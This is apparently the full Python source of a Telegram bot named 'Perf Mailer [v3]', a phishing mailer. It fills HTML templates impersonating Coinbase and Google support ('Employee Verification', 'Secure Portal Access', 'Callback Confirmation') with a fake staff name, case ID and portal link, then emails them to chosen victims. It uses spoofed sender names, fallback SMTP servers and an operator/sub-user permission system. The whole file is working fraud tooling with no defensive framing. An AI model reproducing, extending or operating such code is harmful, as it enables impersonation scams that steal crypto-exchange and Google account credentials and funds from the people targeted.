import json
import os
import smtplib
import time

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
     CallbackQueryHandler,
     MessageHandler,
     ContextTypes,
     filters
)

# int - start0
def init_globals(
     config_path: str = 'config.json',
     users_path: str  = 'backend/database/users.json'
):
     config = json.load(
          open(
               config_path,
               'r'
          )
     )
     token = config['telegram'].get(
          'token'
     ) or config['telegram'].get(
          'botauth'
     )
     users = json.load(
          open(
               users_path,
               'r'
          )
     )
     return config, token, users, users_path

CONFIG, TOKEN, USERS, USERS_PATH = init_globals()

# E | state(s)
e_state = {}
t_state = {}
s_state = {}
cb_state = {}    # <--- state for callback date/time

# auth helpers
def is_authorized(
     user_id: int
):
     return str(
          user_id
     ) in USERS

def is_admin(
     user_id: int
):
     return USERS.get(
          str(
               user_id
          ),
          {}
     ).get(
          'user_info',
          {}
     ).get(
          'admin',
          False
     )

# list the friendly SMTP display names
def smtp_servers(
     service: str
):
     return [
          srv['display']
          for srv in CONFIG['smtp'][service]['servers']
     ]

# find the full entry by its display name
def smtp_entry(
     service: str,
     display: str
):
     for srv in CONFIG['smtp'][service]['servers']:
          if srv['display'] == display:
               return srv
     return CONFIG['smtp'][service]['servers'][0]

# resolve inherited config for under-users
def E_ui(
     user_id: int
):
     ui = USERS[str(
          user_id
     )]['user_info']
     if ui.get(
          'under'
     ) is not None:
          return E_ui(
               ui['under']
          )
     return ui

# template loader(s)
def load_template(
     template_key: str
):
     if template_key.startswith(
          'cb'
     ):
          service = 'coinbase'
          subdir  = template_key[2:]
     elif template_key.startswith(
          'g'
     ):
          service = 'google'
          subdir  = template_key[1:]
     else:
          service = 'coinbase'
          subdir  = template_key

     path = os.path.join(
          'templates',
          service,
          subdir,
          'index.html'
     )
     return open(
          path,
          'r',
          encoding='utf-8'
     ).read()

# base email sender
def send_email(
     to_email:     str,
     subject:      str,
     html_content: str,
     smtp_config:  dict,
     display_name: str = 'Service'
):
     message = MIMEMultipart(
          'alternative'
     )
     message['Subject'] = subject
     message['From']    = formataddr(
          (
               display_name,
               smtp_config['username']
          )
     )
     message['To']      = to_email
     message.attach(
          MIMEText(
               html_content,
               'html'
          )
     )

     start = time.time()
     with smtplib.SMTP_SSL(
          smtp_config['server'],
          smtp_config['port']
     ) as server:
          server.login(
               smtp_config['username'],
               smtp_config['password']
          )
          server.sendmail(
               smtp_config['username'],
               to_email,
               message.as_string()
          )
     eta    = round(
          time.time() - start,
          1
     )
     domain = smtp_config['username'].split(
          '@'
     )[-1]
     return eta, f"smtp.{domain}"

# menu builders
def b_main():
     buttons = [
          [
               InlineKeyboardButton(
                    "🛠️ Config",
                    callback_data="go_config"
               ),
               InlineKeyboardButton(
                    "📨 Support",
                    url="https://t.me/vineotter12"
               )
          ],
          [
               InlineKeyboardButton(
                    "📁 Coinbase",
                    callback_data="go_coinbase"
               ),
               InlineKeyboardButton(
                    "🌐 Google",
                    callback_data="go_google"
               )
          ]
     ]
     return InlineKeyboardMarkup(
          buttons
     )

def b_config(
     user_id: int
):
     real_ui = USERS[str(
          user_id
     )]['user_info']
     ui      = E_ui(
          user_id
     )
     all_cb  = smtp_servers('coinbase')
     all_g   = smtp_servers('google')
     text    = (
          f"🛠️ *Your \\[ Config \\]*\n"
          f"Employee: `{ui.get('staff_name','N/A')}`\n"
          f"Case ID: `{ui.get('case_id','N/A')}`\n"
          f"Portal URL: `{ui.get('portal_url','N/A')}`\n\n"
          f"SMTP Server\\(s\\):\n"
          f" • Coinbase: `{' | '.join(all_cb)}`\n"
          f" • Google:   `{' | '.join(all_g)}`"
     )

     buttons = []
     if real_ui.get('can_edit', True):
          buttons += [
               [
                    InlineKeyboardButton(
                         "Edit Employee Name",
                         callback_data="edit_staff_name"
                    ),
                    InlineKeyboardButton(
                         "Edit Case ID",
                         callback_data="edit_case_id"
                    )
               ],
               [
                    InlineKeyboardButton(
                         "Edit Portal URL",
                         callback_data="edit_portal_url"
                    ),
                    InlineKeyboardButton(
                         "Change SMTP",
                         callback_data="edit_smtp"
                    )
               ]
          ]

     buttons.append([
          InlineKeyboardButton(
               "🔙 Back",
               callback_data="go_home"
          )
     ])

     if not real_ui.get('can_edit', True):
          text += "\n\n🔒 This config is managed by your admin and cannot be edited"
          buttons = [buttons[-1]]

     return text, InlineKeyboardMarkup(
          buttons
     )

def b_coinbase():
     buttons = [
          [
               InlineKeyboardButton(
                    "👤 Employee Verification",
                    callback_data="cbemployee"
               ),
               InlineKeyboardButton(
                    "🧷 Panel Access",
                    callback_data="cbpanel"
               )
          ],
          [
               InlineKeyboardButton(
                    "🎫 Ticket Update",
                    callback_data="cbticket"
               ),
               InlineKeyboardButton(
                    "📞 Callback Confirmation",
                    callback_data="cbcallback"
               )
          ],
          [
               InlineKeyboardButton(
                    "🔙 Back",
                    callback_data="go_home"
               )
          ]
     ]
     return (
          "📁 Coinbase Commands\n\nPlease update your config before using these templates",
          InlineKeyboardMarkup(
               buttons
          )
     )

def b_google():
     buttons = [
          [
               InlineKeyboardButton(
                    "👤 Support Verification",
                    callback_data="gemployee"
               ),
               InlineKeyboardButton(
                    "🧷 Secure Portal Access",
                    callback_data="gpanel"
               )
          ],
          [
               InlineKeyboardButton(
                    "🔙 Back",
                    callback_data="go_home"
               )
          ]
     ]
     return (
          "📁 Google Commands\n\nPlease update your config before using these templates",
          InlineKeyboardMarkup(
               buttons
          )
     )

async def start(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     intro  = "Perf Mailer [v3]"
     markup = b_main()
     if update.callback_query:
          await update.callback_query.answer()
          await update.callback_query.edit_message_text(
               intro,
               reply_markup=markup
          )
     else:
          await update.message.reply_text(
               intro,
               reply_markup=markup
          )

async def under(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     admin_id = update.effective_user.id
     if not is_admin(
          admin_id
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          await update.message.reply_text(
               "Usage: /under [new_user_id]"
          )
          return
     new_id = context.args[0]
     if new_id in USERS:
          await update.message.reply_text(
               f"User {new_id} already exists."
          )
          return
     USERS[new_id] = {
          "id": int(
               new_id
          ),
          "user_info": {
               "admin":    False,
               "under":    admin_id,
               "can_edit": False
          }
     }
     with open(
          USERS_PATH,
          'w'
     ) as f:
          json.dump(
               USERS,
               f,
               indent=4
          )
     await update.message.reply_text(
          f"[OK] User {new_id} added under your config; they cannot edit it."
     )

async def config(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     text, markup = b_config(
          user_id
     )
     if update.callback_query:
          await update.callback_query.answer()
          await update.callback_query.edit_message_text(
               text,
               reply_markup=markup,
               parse_mode='MarkdownV2'
          )
     else:
          await update.message.reply_text(
               text,
               reply_markup=markup,
               parse_mode='MarkdownV2'
          )

async def support_cmd(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     if not is_authorized(
          update.effective_user.id
     ):
          return
     await update.message.reply_text(
          "contact @ for support issues"
     )

async def template_cmd(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE,
     key: str,
     title: str
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ) or len(
          context.args
     ) != 1:
          return
     recipient = context.args[0]
     ui        = E_ui(
          user_id
     )
     tpl       = load_template(
          key
     )
     html      = tpl.replace(
          '{staff_name}',   ui['staff_name']
     ).replace(
          '{ticket_number}',ui['case_id']
     ).replace(
          '{case}',         ui['case_id']
     ).replace(
          '{panel_url}',    ui['portal_url']
     ).replace(
          '{portal_link}',  ui['portal_url']
     ).replace(
          '{domain}',       ui['portal_url']
     )
     service     = 'coinbase' if key.startswith('cb') else 'google'
     svc_cfg     = CONFIG['smtp'][service]
     chosen_disp = ui.get(
          f'smtp_{service}',
          smtp_servers(service)[0]
     )
     entry       = smtp_entry(
          service,
          chosen_disp
     )
     smtp_cfg    = {
          'server':   entry['host'],
          'port':     svc_cfg['port'],
          'username': entry['username'],
          'password': entry['password']
     }
     disp_name   = ' ' if service == 'coinbase' else 'Google'

     try:
          eta, host = send_email(
               recipient,
               title,
               html,
               smtp_cfg,
               disp_name
          )
          await update.message.reply_text(
               f"✅ Success\n"
               f"📤 SMTP: `{host}`\n"
               f"⏱️ ETA: `{eta}` seconds\n"
               f"📧 Recipient: `{recipient}`",
               parse_mode='Markdown'
          )
     except smtplib.SMTPRecipientsRefused:
          if service == 'coinbase':
               # try fallback
               fallbacks = [
                    srv for srv in CONFIG['smtp']['coinbase']['servers']
                    if srv['display'] != chosen_disp
               ]
               if fallbacks:
                    fb = fallbacks[0]
                    fb_cfg = {
                         'server':   fb['host'],
                         'port':     svc_cfg['port'],
                         'username': fb['username'],
                         'password': fb['password']
                    }
                    try:
                         eta, host = send_email(
                              recipient,
                              title,
                              html,
                              fb_cfg,
                              disp_name
                         )
                         await update.message.reply_text(
                              f"✅ Success (fallback)\n"
                              f"📤 SMTP: `{host}`\n"
                              f"⏱️ ETA: `{eta}` seconds\n"
                              f"📧 Recipient: `{recipient}`",
                              parse_mode='Markdown'
                         )
                    except smtplib.SMTPException:
                         await update.message.reply_text(
                              "smtps for coinbase down, please contact an admin"
                         )
               else:
                    await update.message.reply_text(
                         "smtps for coinbase down, please contact an admin"
                    )
          else:
               raise

# menu mapping
MENU_MAP = {
     'cbemployee': (
          'cbemployee',
          'Coinbase Employee Verification'
     ),
     'cbpanel': (
          'cbpanel',
          'Secure Support Portal Access'
     ),
     'cbticket': (
          'cbticket',
          'Coinbase Ticket Update'
     ),
     'cbcallback': (
          'callback',
          'Coinbase Callback Confirmation'
     ),
     'gemployee': (
          'gemployee',
          'Google Support Representative Verification'
     ),
     'gpanel': (
          'gpanel',
          'Google Secure Portal Access'
     )
}

async def button_handler(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     query   = update.callback_query
     await query.answer()
     user_id = query.from_user.id
     data    = query.data

     if not is_authorized(
          user_id
     ):
          return
     if data == 'go_home':
          return await start(
               update,
               context
          )
     if data == 'go_config':
          return await config(
               update,
               context
          )
     if data == 'go_coinbase':
          txt, menu = b_coinbase()
          return await query.edit_message_text(
               txt,
               reply_markup=menu
          )
     if data == 'go_google':
          txt, menu = b_google()
          return await query.edit_message_text(
               txt,
               reply_markup=menu
          )
     if data == 'edit_smtp':
          all_cb = smtp_servers('coinbase')
          all_g  = smtp_servers('google')
          prompt = (
               "Here are all our current smtps:\n\n"
               "SMTP Servers:\n"
               f"1: Coinbase: `{' | '.join(all_cb)}`\n"
               f"2: Google:   `{' | '.join(all_g)}`\n\n"
               "Type `1 smtp.ms2-coinbase.com` to set primary for Coinbase,\n"
               "or `2 smtp.mx1-google.com` to set primary for Google."
          )
          s_state[user_id] = True
          return await query.edit_message_text(
               prompt,
               parse_mode='Markdown'
          )
     if data.startswith(
          'edit_'
     ):
          field = data.split(
               '_',
               1
          )[1]
          e_state[
               user_id
          ] = field
          return await query.edit_message_text(
               f"[!] Send new: {field.replace('_',' ').title()}:"
          )

     if data == 'cbcallback':
          cb_state[user_id] = {
               'key':    'callback',
               'title':  'Coinbase Callback Confirmation'
          }
          return await query.edit_message_text(
               "Please send date and time, example: 4PM March 7th"
          )

     if data in MENU_MAP:
          key, title = MENU_MAP[
               data
          ]
          t_state[
               user_id
          ] = {
               'key': key,
               'title': title
          }
          return await query.edit_message_text(
               f"✉️ Send recipient email for {title}:"
          )

async def message_input(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     text     = update.message.text.strip()

     # handle free-text SMTP change
     if user_id in s_state:
          parts = text.split(maxsplit=1)
          if len(parts) != 2 or parts[0] not in ('1','2'):
               return await update.message.reply_text(
                    "invalid pickings, type: -> `1 smtp.example.com` or `2 smtp.example.com`.",
                    parse_mode='Markdown'
               )
          idx, chosen = parts
          ui = USERS[str(
               user_id
          )]['user_info']
          if idx == '1':
               ui['smtp_coinbase'] = chosen
          else:
               ui['smtp_google']  = chosen
          with open(
               USERS_PATH,
               'w'
          ) as f:
               json.dump(
                    USERS,
                    f,
                    indent=4
               )
          s_state.pop(
               user_id,
               None
          )
          return await config(
               update,
               context
          )

     # config edits
     if user_id in e_state:
          field = e_state.pop(
               user_id
          )
          USERS[str(
               user_id
          )]['user_info'][
               field
          ] = text
          with open(
               USERS_PATH,
               'w'
          ) as f:
               json.dump(
                    USERS,
                    f,
                    indent=4
               )
          return await config(
               update,
               context
          )

     # capture callback date/time
     if user_id in cb_state:
          st = cb_state.pop(user_id)
          t_state[user_id] = {
               'key':             st['key'],
               'title':           st['title'],
               'callback_window': text
          }
          return await update.message.reply_text(
               f"✉️ Send recipient email for {st['title']}:"
          )

     # template send-outs (including callback (xx-xx-xx-00))
     if user_id in t_state:
          st    = t_state.pop(
               user_id
          )
          key   = st['key']
          title = st['title']
          ui    = E_ui(
               user_id
          )
          tpl   = load_template(
               key
          )
          html  = tpl.replace(
               '{staff_name}',   ui['staff_name']
          ).replace(
               '{ticket_number}',ui['case_id']
          ).replace(
               '{case}',         ui['case_id']
          ).replace(
               '{panel_url}',    ui['portal_url']
          ).replace(
               '{portal_link}',  ui['portal_url']
          ).replace(
               '{domain}',       ui['portal_url']
          )
          if key == 'callback':
               html = html.replace(
                    '{callback_window}',
                    st.get('callback_window', '')
               )
               service = 'coinbase'
          else:
               service = 'coinbase' if key.startswith('cb') else 'google'

          svc_cfg     = CONFIG['smtp'][service]
          chosen_disp = ui.get(
               f'smtp_{service}',
               smtp_servers(service)[0]
          )
          entry       = smtp_entry(
               service,
               chosen_disp
          )
          smtp_cfg    = {
               'server':   entry['host'],
               'port':     svc_cfg['port'],
               'username': entry['username'],
               'password': entry['password']
          }
          disp_name   = ' ' if service == 'coinbase' else 'Google'

          try:
               eta, host = send_email(
                    text,
                    title,
                    html,
                    smtp_cfg,
                    disp_name
               )
               return await update.message.reply_text(
                    f"✅ Success\n"
                    f"📤 SMTP: {host}\n"
                    f"⏱️ ETA: {eta} seconds\n"
                    f"📧 Recipient: {text}"
               )
          except smtplib.SMTPRecipientsRefused:
               if service == 'coinbase':
                    fallbacks = [
                         srv for srv in CONFIG['smtp']['coinbase']['servers']
                         if srv['display'] != chosen_disp
                    ]
                    if fallbacks:
                         fb = fallbacks[0]
                         fb_cfg = {
                              'server':   fb['host'],
                              'port':     svc_cfg['port'],
                              'username': fb['username'],
                              'password': fb['password']
                         }
                         try:
                              eta, host = send_email(
                                   text,
                                   title,
                                   html,
                                   fb_cfg,
                                   disp_name
                              )
                              return await update.message.reply_text(
                                   f"✅ Success (fallback)\n"
                                   f"📤 SMTP: {host}\n"
                                   f"⏱️ ETA: {eta} seconds\n"
                                   f"📧 Recipient: {text}"
                              )
                         except smtplib.SMTPException:
                              return await update.message.reply_text(
                                   "smtps for coinbase down, please contact an admin"
                              )
                    else:
                         return await update.message.reply_text(
                              "smtps for coinbase down, please contact an admin"
                         )
               else:
                    raise

async def adduser(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     uid = update.effective_user.id
     if not is_admin(
          uid
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          return
     new = context.args[0]
     if new in USERS:
          return

     USERS[
          new
     ] = {
          "id": int(
               new
          ),
          "user_info": {
               "admin": False,
               "staff_name": "John Doe",
               "portal_url": "example.com",
               "case_id": "00000"
          }
     }

     with open(
          USERS_PATH,
          'w'
     ) as f:
          json.dump(
               USERS,
               f,
               indent=4
          )

     await update.message.reply_text(
          f"[OK]! new user ->: {new} added"
     )

async def removeuser(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     uid = update.effective_user.id
     if not is_admin(
          uid
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          return
     rem = context.args[0]
     if rem not in USERS:
          return
     USERS.pop(
          rem
     )
     with open(
          USERS_PATH,
          'w'
     ) as f:
          json.dump(
               USERS,
               f,
               indent=4
          )
     await update.message.reply_text(
          f"[OK]! user with ID: {rem} removed"
     )

if __name__ == '__main__':
     app = ApplicationBuilder().token(
          TOKEN
     ).build()
     app.add_handler(
          CommandHandler('start',       start)
     )
     app.add_handler(
          CommandHandler('config',      config)
     )
     app.add_handler(
          CommandHandler('support',     support_cmd)
     )
     app.add_handler(
          CommandHandler(
               'cbemployee',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbemployee',
                    'Coinbase Employee Verification'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbpanel',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbpanel',
                    'Secure Support Portal Access'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbticket',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbticket',
                    'Coinbase Ticket Update'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbcallback',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'callback',
                    'Coinbase Callback Confirmation'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'gemployee',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'gemployee',
                    'Google Support Representative Verification'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'gpanel',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'gpanel',
                    'Google Secure Portal Access'
               )
          )
     )
     app.add_handler(
          CommandHandler('under',      under)
     )
     app.add_handler(
          CommandHandler('adduser',    adduser)
     )
     app.add_handler(
          CommandHandler('removeuser', removeuser)
     )
     app.add_handler(
          CallbackQueryHandler(button_handler)
     )
     app.add_handler(
          MessageHandler(
               filters.TEXT & ~filters.COMMAND,
               message_input
          )
     )
     print(
          "[!] bot started"
     )
     app.run_polling()
